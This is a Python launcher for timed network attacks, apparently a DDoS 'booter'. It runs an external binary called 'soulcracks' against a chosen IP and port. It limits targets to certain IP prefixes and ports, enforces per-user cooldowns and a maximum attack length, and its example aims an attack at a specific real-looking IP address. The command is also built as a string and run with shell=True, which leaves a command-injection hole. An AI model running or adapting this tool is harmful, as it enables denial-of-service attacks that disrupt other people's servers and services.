import asyncio
import logging
import subprocess
import threading
from datetime import datetime

# Constants
blocked_ports = {10000, 10001, 10002, 17500, 20000, 20001, 20002, 443}
ALLOWED_PORT_RANGE = range(10003, 30000)
ALLOWED_IP_PREFIXES = ("20.", "4.", "52.")
BINARY = "./soulcracks"  # Replace with your binary name
MAX_ATTACK_TIME = 300  # Maximum attack duration in seconds
ATTACK_COOLDOWN = 60  # Cooldown between attacks in seconds

# Global variables
attack_in_process = False
attack_start_time = None
attack_duration = 0
user_last_attack = {}

# Logging setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Function to run the attack command
def run_attack(target_ip, target_port, duration):
    command = f"{BINARY} {target_ip} {target_port} {duration}"
    try:
        subprocess.run(command, shell=True, check=True)
        logging.info(f"Attack launched on {target_ip}:{target_port} for {duration} seconds.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to execute attack command: {e}")

# Function to process the attack command
def process_attack_command(target_ip, target_port, duration, user_id):
    global attack_in_process, attack_start_time, attack_duration

    # Check if an attack is already in progress
    if attack_in_process:
        logging.warning("An attack is already in progress.")
        return

    # Validate target IP
    if not target_ip.startswith(ALLOWED_IP_PREFIXES):
        logging.error(f"Invalid target IP: {target_ip}")
        return

    # Validate target port
    if target_port not in ALLOWED_PORT_RANGE or target_port in blocked_ports:
        logging.error(f"Invalid or blocked port: {target_port}")
        return

    # Validate attack duration
    if duration > MAX_ATTACK_TIME:
        logging.error(f"Attack duration exceeds maximum allowed time: {duration} seconds")
        return

    # Check cooldown for the user
    if user_id in user_last_attack:
        time_since_last_attack = (datetime.now() - user_last_attack[user_id]).total_seconds()
        if time_since_last_attack < ATTACK_COOLDOWN:
            logging.warning(f"User {user_id} must wait {ATTACK_COOLDOWN - time_since_last_attack:.2f} seconds before attacking again.")
            return

    # Set attack status
    attack_in_process = True
    attack_start_time = datetime.now()
    attack_duration = duration
    user_last_attack[user_id] = datetime.now()

    # Run the attack in a separate thread
    attack_thread = threading.Thread(target=run_attack, args=(target_ip, target_port, duration))
    attack_thread.start()

    # Schedule attack status reset
    threading.Timer(duration, reset_attack_status).start()

    logging.info(f"Attack initiated by user {user_id} on {target_ip}:{target_port} for {duration} seconds.")

# Function to reset attack status
def reset_attack_status():
    global attack_in_process
    attack_in_process = False
    logging.info("Attack finished. System ready for the next attack.")

# Example usage
if __name__ == "__main__":
    # Simulate a user ID
    user_id = "12345"

    # Example attack parameters
    target_ip = "20.204.16.70"  # Replace with the target IP
    target_port = 10426         # Replace with the target port
    duration = 200              # Replace with the attack duration in seconds

    # Process the attack command
    process_attack_command(target_ip, target_port, duration, user_id)